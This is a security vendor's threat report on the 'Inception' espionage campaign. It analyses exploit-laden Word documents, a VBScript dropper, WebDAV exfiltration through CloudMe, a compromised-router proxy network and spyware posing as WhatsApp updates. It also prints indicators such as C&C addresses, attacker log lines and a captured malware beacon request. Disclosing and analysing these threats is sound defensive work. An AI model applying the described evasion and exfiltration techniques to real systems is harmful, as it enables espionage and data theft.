Inception framework; but there ends all similarity with the movie by the same
name. Leonardo DiCaprio is not associated with this investigation.
                                                                                3
PART I:
CloudMe
          4
Use of trojanized documents
We initially knew little about who the actual targets were; apart from one. In that
particular case we had the actual phishing email, so we knew the apparent
recipient 
 the CEO of a large Russian bank. The email was apparently sent from
Mrs. World
; note the Mrs., and not Miss - World.
The weaponized Microsoft Word document attached to the email message
photo.doc
) contained two separate exploits: one targeting the vulnerability
detailed in CVE-2012-0158 (MSCOMCTL ActiveX Buffer Overflow); the other
targeting the aforementioned CVE-2014-1761.
                                                                                 5
Above: 
Mrs. World
. Text and picture apparently taken from the news site mk.ru
We soon discovered that our malware repository contained several other, similar
documents, but these had come from other sources which did not include the
email message, or any identifiable information about the targets. However, the
text of the documents covered a variety of topics mostly revolving around
Russian issues relating to a variety of business sectors. The following pages
highlight a representative selection of these documents.
                                                                            6
An article cribbed verbatim from the
Novye Izvestiya news Web site
about the Russian financial situation
in light of the Ukrainian crisis.
An application form to participate in
a seminar supposedly organized by
Russia
s Federal Service for
Defense Contracts (
scheduled for Sept 24/25 2014.
An article, in English, about the
Ukraine situation taken from the
Financial Times (UK) newspaper.
advertisement
 from a supplier
of diesel engines and related
mechanical services. The letter lists
the Russian navy and the Border
Guard department of the FSB
among their customers.
                                  7
Organigrama Gobierno Rusia.doc
 a summary profile of several high-
level Russian government officials 
originally submitted to VirusTotal
from an IP address in Spain.
An advertisement of a used car for
sale that purportedly originated from
an employee at the German
Embassy in Moscow.
Invitation to Russian Art Week
                                 8
Document metadata
All documents that we have found so far have been rather standard Word
documents, of the old 97-2003 compatible format based on OLE2.
Such documents can, and typically do, contain quite a bit of metadata: The name
of the document creator; the user who edited it most recently; the name of the
company whose copy of Word was used to create the document, et al. Users can
optionally configure Word to remove this metadata when a document is saved,
and that
s exactly what the creator of these documents did, stripping out this
potential source of attribution data.
However, Word documents in this format contain additional information, if you
know where to look.
All Word documents of this format contain what
s known as a File Information
Block (FIB). The FIB contains information about the file
s internal structure, and
also 
 to some extent 
 data on the program used to create the file. In the case
of the samples we analyzed, all of the documents were saved using the same
build of Microsoft Word from Office14 (better known as Office 2010).
In addition, documents can contain slack space in which old data remains. For
example, the decoy that came with the attack named 
Organigrama Gobierno
Rusia.doc
 contains Visual Basic leftovers indicating that it originally was created
on a computer that was configured to be used by a native Spanish speaker,
apparently by an advisor at the Spanish Embassy in Moscow. This document
was presumably obtained by the attackers and repurposed for the attack.
                                                                                 9
Targeted verticals
Despite the limited information at our disposal about the targets of these attacks,
their content reveals some context about who the possible targets may have
been.
First of all, we have the decoy documents which indicate an interest in:
   -   Embassies
   -   Politics
   -   Finance
   -   Military
   -   Engineering
We also have a set of phishing mails, which were targeted at:
   -   The finance sector in Russia
   -   The oil and energy industry in Romania, Venezuela, and Mozambique
   -   Embassies and diplomats from various countries
                                                                              10
Shellcode
The shellcode used is a pretty standard variant previously used by a number of
campaigns typically operating out of China, but with some minor changes. The
malicious content is stored inside the document in encoded form, and the
shellcode decodes and writes this to disk.
Above: The decoding loop
Upon successful execution this code drops a Word document and a Visual Basic
script. The Word document is displayed to the user to avoid arousing any
suspicion while the script is executed in the background.
Unusual for many exploit campaigns, the names of the dropped files vary; for
example HyHa9AJ.vbs, ew_Rg.vbs, 0_QHdN.vbs, etc. 
 clearly randomized in
order to avoid detection by name.
                                                                           11
Visual Basic Script dropper
The VBScript dropper code is also a little unusual. It declares a Windows
Management Instrumentation (WMI) object in order to reach components like the
registry and file system. This seems adapted from Microsoft example code, like
the one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx
When the VBSript is run it drops two files to disk. One is a polymorphed dll file
and the other a binary data file with no obvious internal structure. This data file
turns out to be encrypted using AES-256.
                                                                                12
The files will be installed in several locations:
%WinDir%,            ex. 
C:\Windows
%APPDATA%,           ex. 
C:\Users\USERNAME\AppData\Roaming
%ALLUSERSPROFILE%, ex. 
C:\ProgramData
%CommonProgramFiles%, ex. 
C:\Program Files\Common Files
%USERPROFILE%,       ex. 
C:\Users\USERNAME
These locations will vary some between operating system versions.
The VBScript then sets a startup key in the
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 registry path to
execute the DLLs at boot time.
Regardless of whether the registry launches the DLL or when another malware
executable starts the DLL directly, the DLL is launched using regsrv32.exe with
the /s (silent) option.
The names of these dropped files change from attack to attack. The one above
drops ctfmonrc.dll. Other names observed were:
ctfmonm.dll
ctfmonrn.dll
wmiprvse.dll
alg.dll
dwm.dll
The encrypted data files are named using random words apparently taken from a
dictionary 
acholias
arzner
bicorporate
crockrell
damnatorily
 etc.
                                                                            13
DLL payload
Looking at one of the dropped dlls we can see the authors originally called it
95Num3P3gm.dll.polymorphed.dll. When executed it will rebuild the original dll
(95Num3p3gm.dll, presumably), load it from memory and pass over execution.
In the early stages of our research, most other payloads followed the same
naming convention, eg., fvK3J15B5d.DLL.polymorphed.DLL;
LvwU9gnFO.DLL.polymorphed.DLL; NR5vaFTe9R.DLL.polymorphed.DLL;
hs78lg7x5F.DLL.polymorphed.DLL, etc. More recently collected samples no
longer contain the 
polymorphed
 string.
It is hard to describe the polymorphed dlls with any real depth, as there is little
consistency between them. When two nearly identical dlls are encoded using the
polymorphic scheme there is very little code in common. The call graphs are
different and key functions have varying number of arguments. The polymorphing
mechanism also generates, and inserts, unique functions all of which make calls
to different floating-point operations 
 all done just to obfuscate the actual
decoding process. The sizes of buffers allocated are also randomized to mask
their intent.
                                                                             14
A portion of one of the dynamically generated functions.
What is common is that somewhere along the execution cycle is one extremely
large function (over 200 kb in length) where early in a large allocation is made
where the un-obfuscated binary will be placed. The binary is then built from de-
obfuscating segments of it that have been dispersed through the 
.rdata
 section.
The order, size, and locations of these segments vary from build to build but
somewhere near the end of the large function there will be a call to a subfunction
that loads the PE image into memory, followed by a call to free the PE image
allocation from memory. Simply halting execution before this function call permits
a researcher to extract the reconstructed DLL from memory.
                                                                             15
Here, pausing execution before the call to 
load_pe_from_memory
 reveals the
extracted PE at the memory address pointed to by edx.
This reconstructed DLL, once loaded, will decode a configuration structure from
its 
.data
 section which contains three important details: the name of the
encrypted data file dropped by the VBScript; the AES key used to decrypt the file;
and the name of a unique global mutex to hold while running to prevent multiple
instances.
This configuration information is used to load the encrypted file into memory and
decrypt it. This turns out to be yet another dll. The first ordinal exported by this dll
is located and then called, passing in the configuration and the name of the
encrypted file on disk as parameters.
                                                                                  16
This last dll is the heart of the threat (originally called q5Byo.dll in this instance.
This file contains the true intent of this campaign. It is designed as a survey tool.
The PE file gathers system information including OS version, computer name,
user name, user group membership, the process it is running in, locale ID
s, as
well as system drive and volume information. All of this is encrypted and then
sent to cloud storage via WebDAV.
                                                                                  17
The malware installation chain
                                 18
WebDAV cloud usage
WebDAV is a communication standard that allows file management over HTTP
or HTTPS. Windows allows WebDAV sessions to be mapped as network
resources.
The use of WebDAV as the communication channel is atypical for most malware
samples we see. By using a network resource, the actual web traffic originates
from the system itself, and not from the process in which the malware resides.
Additionally, once the resource is established, the malware can transfer files to
and from the command and control servers using standard file IO commands.
All the authentication information for the WebDAV session including the URL,
folders, path, user name, and password is stored within this last DLL in another
AES-encrypted configuration structure in the binary.
A unique path, username, and password were used for each malware instance
ve seen in the wild. This allows the attackers to uniquely identify every
targeted attack and track how successful each phishing campaign is.
Also contained within the configuration structure is information on how to name
the survey data on the remote file server. The binary reads from its configuration
a string on how to generate the remote filename, and a list of extensions to use.
An example would be 
_1-7d_0-8s
] which instructs the
binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to
8 ASCII letters with one of the three listed extensions such as 
664gher.TAR
The survey is then uploaded to the server in a specified folder with the generated
name.
Files are compressed using a modified LZMA-compression and encrypted using
AES cipher-block-chaining (CBC) before being uploaded to the cloud server.
The binary also checks a separate folder on the cloud service designated to
contain new configuration information. If such a file is present on the server, the
malware downloads the new configuration file then deletes it from the server.
                                                                               19
The cloud storage provider in every case we have seen was the Swedish
company CloudMe.com, which offers free and paid WebDAV cloud storage.
The URI model used by the malware is
http://webdav.cloudme.com/%username%/CloudDrive/ which is a direct
reference to file storage.
It must be noted that the CloudMe service is not actively spreading the malicious
content; the attackers are only using it for storing their files.
We notified CloudMe.com about the abuse of their services. Their CEO, Mr.
Daniel Arthursson, was none too happy about this, and was very helpful in our
further research. CloudMe has shared a great deal of log information related to
this attack. These indicate that there are many other accounts (over 100) likely
related to this attack system. We have no way of verifying this with absolute
certainty, but this is what we regard as a high confidence assumption.
                                                                             20
Distribution of logged victim connections towards CloudMe.
The cloud accounts are not used for one-way communication only. The malware
also checks configured subfolders for updates; and if these are found they will be
downloaded, decrypted and used as appropriate.
One such case is the franko7046 account, used against the previously
mentioned bank CEO. In this account there was hidden another encrypted
configuration file which the malware downloaded and decrypted.
Above: The configuration file of the depp3353 account. Password is redacted.
                                                                             21
This is how we found the depp3353 account. In this new account there was
another surprise waiting for us 
 a download folder with two new encrypted files,
921.bin and 922.bin. Once decrypted, these turned out to be PE executables.
Downloaded plugins: Cloud persistence
The two new executables are plugins - quite similar to each other and obviously
compiled on the same setup. They are lightweight and intended to pull specific
survey information from their target. Of interest, both of the DLLs originally had
the same internal name (78wO13YrJ0cB.dll). Presumably the same PE
sanitization script and parameters were used on both.
None of these plugins contain any means of CnC communication. Instead, when
they are executed they are passed a pointer to a function to use for sending data
back home. Neither are they ever written to disk. They are executed in memory
only, and once they have completed the memory is freed. This makes these
modules extremely stealthy, flexible and compatible with multiple toolsets
independent of what CnC method is being used.
921.bin retrieves several datapoints about the infected machine: Domain info; a
list of running processes with all loaded modules in each; the list of installed
software; and a complete hardware profile of the target machine. 922.bin
compiles a dirwalk 
 a complete listing of every file path 
 of each fixed drive. All
of this information is exfiltrated back via the same WebDAV connection.
This model makes it possible to do the intrusion in steps, with verification stages
in between; and the files will not be easily found on affected computers.
Based on the information gathered from these modules, the attackers appear to
move to the next stage of their attack by placing more new components on the
WebDAV shares. Information about these uploads is limited by the fact that we
do not have the AES keys to decrypt much of the uploaded data, but we have
been able to see some upload patterns.
What we assume to be third-stage plugins appear on the shares as *.bin files of
roughly 72kb. As with other plugins, these are downloaded and deleted from the
share in one go. However, the next day, another *.bin file of the same size will be
uploaded to the share. This is a pattern that repeats itself over all live accounts. It
seems that because the plugins exist in memory only, they are injected daily to
ensure persistence on victim computers. Our theory is that this malware is a
more typical datastealer, and we have observed that after this type of file is
planted on the account, encrypted data uploads from compromised users
increase.
                                                                                 22
The Sheep and the Wolves
Victims of this attack will connect using the Windows WebDAV redirector, and
the HTTP request user-agent string will reflect this. For Windows XP this will
typically be 
Microsoft-WebDAV-MiniRedir/5.1.2600
, and for Windows 7 a
common user-agent is 
Microsoft-WebDAV-MiniRedir/6.1.7601
Security researchers 
 and there are a few of them - connect in a variety of ways;
first of all, we see a number of connections that are indistinguishable from the
way victims connect. This happens when researchers use lab machines with live
internet access to run the malware. The only way we can tell these are
researchers is because they connect from IP address ranges that are unlikely to
be victims; and they also tend to consist of short-lived sessions.
Some researchers set up scheduled tasks to scan the shares for new updates
and malware. We see a few variations of these 
 one typical configuration is
where the requests contain a Python-related user-agent string.
Attackers, on the other hand, don
t appear to use Windows.
Common across multiple accounts, multiple IP
s, and over time, is that the
probable attackers have used a HTTP user-agent of 
davfs2/1.4.6 neon/0.29.6
We know these are not researchers, because we can see malware files being
uploaded by them:
[17/Sep/2014:09:42:38 +0200] "PUT
/white3946/CloudDrive/QxM9C/st/V1oINDJtnqy/1768.bin
HTTP/1.0" 201 0 "-" "davfs2/1.4.6 neon/0.29.6"
Above: Log entry for the account white3946. We have been unable to locate the
malware that uses this account.
We have a log fragment in which the attackers uploaded a sequential series of
updates (from 1746.bin to 1774.bin) within 1.5 hours on Sept 17th, spread over
27 different accounts and using 27 different IP addresses in the process.
The user-agent string shows that attackers likely have used a client based on the
open source davfs2 file system for Linux to mount the WebDAV shares.
                                                                            23
This client is used when uploading new malware, but also when the attackers
scan their shares for new victim updates, in which case the shares are
enumerated by requests in a scheduled manner.
An attacker scans the tem5842 account for updates.
At intervals, scans hop to new IP addresses.
The attackers have used a large number of IP addresses to access the shares.
As mentioned above, there is a rotation scheme in place in which a new IP
address will be used after a few minutes of access against CloudMe accounts.
These IP
s are distributed widely over geographical locations and service
providers, with a heavy bias towards South Korean ranges.
                                                                            24
S. Korea                                85   Australia                                 1
China                                    7   Austria                                   1
United States                            7   Bulgaria                                  1
Brazil                                   5   Canada                                    1
Sweden                                   3   Denmark                                   1
Czech Republic                           2   France                                    1
Norway                                   2   Germany                                   1
Romania                                  2   Kuwait                                    1
Russia                                   2   Latvia                                    1
Spain                                    2   Ukraine                                   1
Distribution of attacker IP addresses
At first we thought these IP
s belonged to some commercial proxy service,
particularly since several such proxy services also offer IP rotation. However, this
turned out to be a wrong assumption.
                                                                              25
PART II:
Support infrastructure
                         26
An embedded device proxy network
A superficial examination of the proxy IP addresses that connected to CloudMe
showed them to be internet-connected devices of various kinds. Many were
Korean Tera-EP home routers; but there were several other products
represented.
It is believed that the attackers were able to compromise these devices based on
poor configurations or default credentials.
We were able to do some forensic work on a compromised Tera-EP TE-800
device and discovered another dimension of the attacker
s infrastructure.
                                                                            27
Router malware
Under the ramfs mounted partition we found a stripped and statically linked
MIPS-el binary named tail-. Instances of this were also found under the running
process list.
tail- serves as a SOCKS proxy for the attackers. Each sample of the binary we
were able to acquire was configured with a unique 32byte blowfish key and a
small, encrypted section appended to the end of the binary.
Upon execution the binary uses its hardcoded key to decrypt the configuration
section and retrieve the listening port to use for incoming connections. This acts
as a management interface. From here the attackers can request a specific port
to be opened as one of the following types: SOCKET, SOCKSS, SOCKAT,
SOCKS5, or STATUSPORT.
To prevent anyone else from accessing this service all communication on the
management interface is encrypted using the same blowfish key. This means
that the attackers must maintain a list of where each of these implants are
installed, as well as what port and key each is configured to use.
This setup makes it difficult to identify embedded devices compromised with this
malware by scanning open ports.
In the wild we witnessed the attackers connect to the management port and
request SOCKSS connections. This would open the specified port and wait for
configuration data, which consists of a domain name (webdav.cloudme.com), the
destination port, and a variable length RC4 key, all of which encrypted using the
blowfish key. Once received the malware would attempt to connect to the
domain name on the specified port and would start tunneling all traffic received
from the SOCKSS port to the destination and vise-versa. The communication
between the attacker and the SOCKSS is encoded using the RC4 key. The
graphic below illustrates a typical session.
                                                                             28
Additional servers
The router proxy network provides another layer of indirection masking the
attackers
 infrastructure. However, because we captured traffic through one of
these embedded devices we could identify other parts of their operation.
We identified four IP addresses that connected to the proxy malware:
Cloud enumerator:
Apparently a rented server at AS34224 NETERRA-AS, Bulgaria
This host belongs to a Bulgarian VPS service and would use the router proxy to
connect to webdav.cloudme.com. This host does all scanning of webdav shares
for stolen user data, and also uploads new malware components.
Health checker:
Apparently a rented server at AS5577 ROOT root SA, Luxembourg.
This IP would make connections hourly and poll the status of the router proxy
malware. This machine is most likely used to track which compromised routers
are currently available for use.
Unlocker:
Apparently a rented server at AS52048 DATACLUB DataClub S.A. Latvia.
Traffic from this IP had a very specific purpose: It unlocked routers for proxying in
connection with the sending of phishing emails.
In the wild we observed this IP connect to our router on the malware
management port and specify a SOCKSS proxy port to be opened. Immediately
after, the newly opened port would be connected to by another IP and used to
send phishing emails with malicious attachments.
However, later we observed that the Email sender IP at VOLIA vanished and the
Unlocker server taking over its role as well.
Email sender:
An IP at AS25229 VOLIA-AS, Ukraine. Possibly a compromised host.
After a router SOCKSS port was opened by Unlocker, this IP would connect to
the opened port and tunnel its email traffic through the router.
Each of these connections used the correct encryption key, so we know that
these accesses came from the attackers and not some opportunistic third party.
                                                                               29
Mail proxies:
Through our router monitoring we identified two mail proxies used by the
attackers. We were later notified by Symantec (thanks, guys!) about a third.
These servers were hosted on domains that were registered by the attackers,
using domain names clearly meant to look legitimate. This is the only time we
have seen attackers register domains in this investigation.
The mail proxies were:
haarmannsi.cz       : Spoof of the legitimate domain haarmannsi.com
sanygroup.co.uk     : Spoof of the legitimate domain sanygroup.com
ecolines.es         : Spoof of the legitimate domain ecolines.net
Registrant WHOIS information seems forged:
haarmannsi.cz
name:      Sanyi TERRAS
address: R. FREI CANECA 1120
           SAO PAULO
           01307-003
           BR
e-mail:    sanyi_terras@outlook.com
created: 12.06.2014
NS:        ns*.frankdomains.com
sanygroup.co.uk:
name:      Alan
address: Uddmansgatan 13
           Pitea
           Norrbottenal
           94471
           SE
created: 06.05.2014
NS:        ns*.domains4bitcoins.com
ecolines.es:
name:        Lyisa Almeida
address: N/A
created: 04.06.2014
NS:          ns*.frankdomains.com
                                                                           30
Observed phishing emails
The connections made from the Ukrainian host to the router were interesting.
After being proxied though the router, each of these would authenticate with one
of the dedicated mail proxies and send out phishing attacks.
From captured traffic it appears that the mail proxies have SOCKSv5 services
running on obscure high ports. We have documented that the attackers log in to
these using apparently randomly generated usernames and passwords, a unique
pair for each server. The mail proxy would then relay the spearphishing mail as
seen below.
Above: Captured SMTP session, sending the malicious attachment MQ1474.doc
This way the attack can be mistaken to come from legitimate businesses and
trusted organizations. In some cases the organization from which the phishing
email originates would appear to be a known associate to the target.
                                                                           31
The email shown above was one of a number of messages sent to targets in the
oil industry. Investigating the target email addresses, we saw several of these
were found in this public document from the World Petroleum Council, including
some addresses that are, at the present time, no longer valid.
And then, the ground shifted again.
                                                                           32
PART III:
Attacks on mobile devices
                            33
One of the spearphishing mails we observed coming through the router network
was this one, sent to an address under the gov.py (Government of Paraguay)
domain.
Get WhatsApp now for your iPhone, Android, BlackBerry or Windows Phone
There was no executable attachment in this mail, but instead a link shortened by
the URL shortener service bit.ly, with the underlying link pointing to an IP address
on a Dutch hosting service. Clicking that link from a Windows PC only yielded a
redirection to the BBC homepages, and using other devices did not give more
data.
The bit.ly service does however provide information on the user creating the
shortened link, and other links associated with this account. In this case, the user
was named nicolatesla53.
                                                                               34
The nicolatesla53 bit.ly profile page
The nicolatesla53 account was created in July 2014. From Oct 24th to Nov 21st
this user created nearly 10000 shortened links 
 we harvested 9990 unique
ones. Three IP addresses were used for these links:
82.221.100.55
82.221.100.60
94.102.50.60
The links themselves were on this format:
http://server_ip/page/index?id=target_identifier&type2=action_code
As far as we were able to tell, there were three main types of action_code:
743 : Serve malware disguised as WhatsApp updates
1024 : Serve malware disguised as Viber updates
other : Serve MMS phishing content. The code identifies mobile operator and
determines which logo will be displayed when the user follows the link.
                                                                              35
MMS Phishing
We have no sample of the actual MMS phishing messages apparently being
sent, but we can see the page served when a user clicks a spammed link. This is
just a dialogue box asking for the password presumably included in the initial
message, and the next stage likely involves download of malicious content.
The password screen for action code 16611 (TELE2)
We were in the middle of harvesting the servers for data on the various action
codes when they all were abruptly taken offline; so our data on which mobile
operators are targeted is not complete. We managed to get 66 of a total of 190.
The ones we know of are shown below. A full breakdown of mobile operators
and related links is included in the appendix.
                                                                           36
The composition of links created for the various mobile operators is quite
interesting, as one can speculate that they represent amount of actual or planned
attacks in different countries. With the top three operators being Vodafone, T-
Mobile and Proximus (Belgacom) it seems these apparent phishing attacks are
less focused on the Russian sphere than the previously discussed malware.
This map is not complete, though. It represents only about 35% (66/190) of all
mobile operators targeted and 66% (3152/4781) of all phishing links we managed
to harvest. In addition, some operators like Vodafone are global actors, so the
map might show an unfair intensity in their HQ locations.
MMS phishing heat map
The rest of the bit.ly links used the action codes 743 or 1024. And now things
really get interesting. By using mobile device HTTP User-Agents we were able to
trigger downloads of malware components from some of these links.
                                                                           37
Mobile malware: Android
Accessing the link from an Android User-Agent initiated a download of an
Android installer package named WhatsAppUpdate.apk. The package we
analyzed was 1.2MB in size.
The apparent main purpose of this malware is to record phone call audio.
Recordings are stored as *.mp4 files, and uploaded to the attackers periodically.
The malware is able to collect a lot of other information, not all of which is
actually used:
   Account data
   Location
   Contacts
   External and Internal Storage (files written)
   Audio (microphone)
   Outgoing calls
   Incoming calls
   Call log
   Calendar
   Browser bookmarks
   Incoming SMS
Through the encrypted C&C protocol, the attackers can issue commands and
binary updates to the malware.
It uses a custom DAO/Database scheme which uses accounts belonging to the
virtual community Live Journal (livejournal.com) as data stores. Three such
accounts were found hardcoded in the package:
The accounts all state that they belong to Iranian users. This is very likely false.
                                                                                 38
The text in these posts starts first out in cleartext, but quickly turns into
unreadable gibberish. The HTML source code reveals that the encoded portion is
encapsulated in blog-index tags:
The three accounts contain different configuration blocks pointing to C&C servers
apparently located in Poland, Germany and Russia, respectively. Based on
registration data and folder configuration we believe these are legitimate but
compromised Joomla servers.
And then an unexpected oddity shows up in the Java source:
The sign in front of SizeRandomStr is 
Truti
 - a Hindi word meaning 
Error
                                                                                39
We were also able to download a similar malware sample (BrowserUpdate.apk)
from one of the C&C servers. This sample used different online accounts for its
DAO/database functionality, but is otherwise quite similar to the first.
                                                                           40
Mobile malware: Apple IOS
Using an IOS User-Agent triggered the download of a Debian installer package,
WhatsAppUpdate.deb, also 1.2Mb in size.
This application impersonates a Cydia installer, and can only be installed on a
jailbroken phone.
Once installed, it may collect
   Device platform, name, model, system name, system version
   ICCID
   User
s address book
   Roaming status
   Phone number
   Carrierbundlename
   Iso country name
   Carrier name
   Wifi status
   MAC address
   Device battery level
   Free and total space
   Cpu frequency and count
   Total and user memory
   Maxsocketbuffersize
   Language local identifier and language display name
   Default and local time zone
   Account data: AccountAvailableServiceTypes, AccountKind,
       AccountSocialEnabled, etc
   AppleID
   CreditDisplayString
   DSPersonID
   IOS specific data; ex LastBackupComputerName,
       LastBackupComputerType, iTunes.store-UserName, iTunes.store-
       downloaded-apps etc.
                                                                             41
These data are encrypted and uploaded to an FTP account which is taken from
an encrypted configuration file named /usr/bin/cores.
In this particular case, the FTP account is located on a legitimate (if struggling)
hosting service in the UK.
In this case, there
s another clue:
The project path in the package contains the name JohnClerk.
The WhatsAppUpdate project seems derived from an earlier template named
SkypeUpdate.
                                                                                42
Mobile malware: Blackberry
By now, it came as no surprise when we triggered a download with a BlackBerry
User-Agent. The initial download was a Java Applications Descriptor, a text file
designed for Over-The-Air installation of Java-based applications. This JAD file
contained the locations of the two Blackberry *.COD binaries which we then
could download directly.
The application impersonates a settings utility. This collects:
   deviceName, manufacturerName
   platformVersion, softwareVersion
   brandVendorId, brandVersion
   total and free flash size of the device
   amount of memory/storage already allocated
   ownerName, ownerInformation
   Phone mumber
   PIN
   IMSI
   IMEI
   mcc and mnc (Mobile Carrier ID)
   cellID
   Location area code
   isPasswordEnabled
   Battery data (level, temperature, voltage, etc)
   Installed applications
   Address book
   APChannel
   Connected Network Type
   BSSID
   DataRate
   Profile Name
   RadioBand
   SecurityCategory
   SignalLevel
   SSID
Collected data will be uploaded to a DynDNS domain currently hosted on a US
webhosting service.
                                                                           43
God_Save_The_Queen
 is used as a reference in one of the Blackberry
binaries.
Since these COD files are also compiled Java code, they are possible to
decompile to original source code. In a similar fashion to the Android version, we
find interesting strings there. This time they are in Arabic:
Reading files
 in Arabic
                                                                             44
PART IV:
Attribution
              45
Timelines and activity patterns
The earliest sample of Inception-related malware we have been able to obtain,
was submitted to us in June 2014. However, decoy document metadata shows
that it was created late May. The related cloud account was created just before
that. An examination of the other documents associated with the attacks show
that they have been created at a steady pace all through summer and autumn
2014 and attacks are still ongoing.
Of interest is also the attackers
 activity patterns over the 24h cycle. The main
upload of new components to shares seems to be divided over two high
activity
periods: 6:00 -10:00 UTC and 17:00 - 21:00 UTC. No uploads were seen
between 23:00 and 05:00 UTC.
It is however doubtful how indicative these timeframes are. To illustrate, we
looked into another and more obscure timing factor: The timing of the AES
InitVector random seeds. A random seed is the initial value passed into a
pseudo-randomizer function. The malware uses the random output to create
what is known as an InitVector - a starting point for the AES
encryption/decryption function.
The code used in some of the DLLs indicate that the attackers tend to use the C
time() function to generate random seeds. This function returns values of
granularity down to seconds. Thus random seeds, and ultimately the InitVectors,
are functions of these quite coarse units of time.
The encrypted files uploaded to the WebDAV shares come with their InitVectors
stored at the end of the file. Since we know the time window to be within a few
days of the upload time we were able to brute force the time values that would
generate the corresponding InitVectors. Thus, we were able to say to the second
when the file was created 
 and most times were identified to be in the range
1500 - 2200 GMT.
Unfortunately, we had to reject these data. The file creation times turned out to
be hours after the files themselves were uploaded to the WebDAV share. Either
the attackers
 system clock is wrong or a fixed offset is added to the random
seed. Either way, the data can
t be trusted; and shows that nothing can be taken
at face value.
                                                                             46
The Chinese connection
On at least two occasions during our surveillance of the Inception framework, the
malware downloaded something unexpected and wholly different from what we
have discussed until now.
These files were downloaded as encrypted *.bin files from the accounts
carter0648 and frogs6352. When decrypted, these turned out to be dropper
packages containing one dropper executable clearly created for the Inception
framework, and one other, very different executable.
This executable, (sccm.exe, md5 dd8790455109497d49c2fa2442cf16f7) is a
classical Chinese APT implant. It is a downloader and remote shell program,
designed to connect to a C&C server to interact with the attacker and/or
download more malware.
The C&C server in this case is ict32.msname.org.
When connecting to this server, sccm.exe issues the following request:
POST /check.jsp HTTP/1.1
Accept: */*..Accept-Language:en-us
Content-Type: application/octet-stream
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: www.antivir.com
Content-Length: 8
Connection: Keep-Alive
Cache-Control: no-cache
This C&C domain is used by many other malwares related to sccm.exe; some of
which share obvious connections to the Quarian malware family, a known APT
intrusion tool.
This development was unexpected for several reasons. First of all, it apparently
breaks the strict, obfuscatory operational security built into the Inception
framework. Inception has the capacity to perform all steps needed for scouting
out and exfiltrating data without resorting to traditional hosted command &
control. By using a well-understood APT tool and a known malicious C&C
domain name, the attackers permit much clearer attribution.
                                                                            47
Another factor which is out of character is the coding style. All Inception-related
malware is written using Visual Studio 2010. The downloaded sccm.exe is written
using Visual C++ 6; and has a PE header compile date of October 2010.
This date can be forged, and indeed, all Inception-related malware has some
level of forgery in the compile dates. However, the sccm.exe compile date
matches the Quarian developer toolset and coding style to a better degree than
the other files distributed through Inception.
Then there is the C&C domain used. According to DomainTools.com the
msname.org domain registration timed out September 27th 2014. It was left
inactive and was not renewed until Nov 12th. This means that the attackers
distributed malware that would be out of action for a long time (last distribution of
sccm.exe was September 26th).
Because of all this we consider sccm.exe as an unreliable indicator. It is likely to
be a red herring purposefully placed on shares where the attackers have seen
signs of access by security researchers.
An odd indicator
At one instance the attackers seem to have slipped up. Instead of using their
scheduled task, they apparently did something manually on a WebDAV share.
This is visible because the request came from an apparent attacker IP, but used
yet another User-Agent: 
gvfs/1.12.3
Gvfs is the virtual filesystem for Gnome desktop. The action on the account was
abnormal as well; an apparent file upload:
83.53.147.144 - - [02/Sep/2014:09:53:56 +0200] "PUT
/tem5842/Documento%20sin%20t%C3%ADtulo HTTP/1.1" 408 0 "-"
"gvfs/1.12.3"
Documento sin t
tulo
 means 
Untitled document
 in Spanish.
When WebDAV shares are mapped up as drives by the operating system, any
action taken by the attacker follows the same pattern as on the attacker
s local
drive. In the case above, it seems the attacker attempted to edit a new
document, which by default is given the name 
Untitled document
 in Gnome.
This might indicate that the attacker
s operating system language is Spanish.
Of course, Spanish is one of the world
s most widespread languages, so one
cannot infer much from this. There is even a small possibility that the
phenomenon is a pure artifact; for example that a Spanish-speaking researcher
connected to the same account using the same Linux-based setup as the
attackers.
                                                                                48
Similarities with Red October
This attack system shares a number of properties that are somewhat similar with
the Red October campaigns detailed by Kaspersky Labs in 2013.
For more information about this see:
The "Red October" Campaign - An Advanced Cyber Espionage Network
Targeting Diplomatic and Government Agencies
       -   Target countries and verticals overlap to some extent
       -   The topics of some decoy documents are the same (eg. 
Diplomatic
           Car for sale
       -   Similar overall loading architecture, with dropping of encrypted binaries
           that are later decrypted and loaded
       -   Exploited documents contain certain similarities (i.e. the magic string
           
PT@T
 used as a marker to locate the shellcode)
However, there are also clear differences. The code is fully rewritten; there
appears to be little code overlap, at least in the initial stage malware. The coding
style is different, with different solutions to programmatic problems, different use
of exception handling, and different use of C++ classes. It
s hard to believe that
the same programmers are responsible for the two code bases.
The Red October malware contained linguistic markers that pointed towards
Russian speaking attackers. No such clues have been found in the Inception-
related malware; there is a marked difference in the attention to detail and
information leakage.
It is certainly possible that the same people have organized both Inception and
Red October, but there are no clear indications to this effect.
                                                                               49
Strings in malware
The Windows-based malware in this paper generally contains very few
noticeable strings apart from what is commonly found in software, and clearly
randomized strings. What exists 
 like the word 
polymorphed
 in the early DLL
versions - is standard English with few discerning features.
This changes a bit when we look at the mobile malware. In the Android malware
we find Hindi comments in the Java source code. In the Iphone malware we find
project paths referencing one 
JohnClerk
, and a few typos like 
conutry
. In one
of the Blackberry binaries we find the string 
God_Save_The_Queen
, a rather
blunt hint towards Britain, as well as Arabic log strings.
These and other indicators have led us to conclude that the Inception attackers
are setting a new standard for deliberate disinformation and red herrings in a
malware espionage operation. Some clues might have been added by accident,
but none of these indicators can be trusted in any way. Thus we are not going to
assume anything about who might be behind these attacks.
                                                                             50
              Conclusion
              The whole Inception setup shows signs of automation and seasoned
              programming. The amount of layers used in this scheme to protect the payload
              of their attack seems excessively paranoid. Not only is the initial DLL apparently
              polymorphed using some backend tool 
 the compile time stamps in the PE
              header are clearly forged, resources are removed so as not to give away any
              location information, and import tables are shuffled around, rendering import
              hashes (aka imphashes) useless.
              The names of the files both when dropped and their original names along with
              the callback directories, paths and mutexes used all seem to be dynamically
              generated.
              The attackers utilize compromised embedded devices 
 typically routers- on the
              Internet as well as multiple dedicated hosting providers and VPN services to
              mask their identity from the cloud storage provider and others. The same router
              botnet is used as a spreading and management platform for attacks on mobile
              devices as well.
              This suggests that this a large campaign and we
ve only seeing the beginning of
              it. Initially many of the targets were located in Russia or related to Russian
              interests, but as the campaign has evolved we have verified targets in countries
              all over the world.
              It is clear that this infrastructure model does not need to be applied solely against
              a few targets, or even need to be hosted at CloudMe. The framework is generic,
              and will work as an attack platform for a multitude of purposes with very little
              modification.
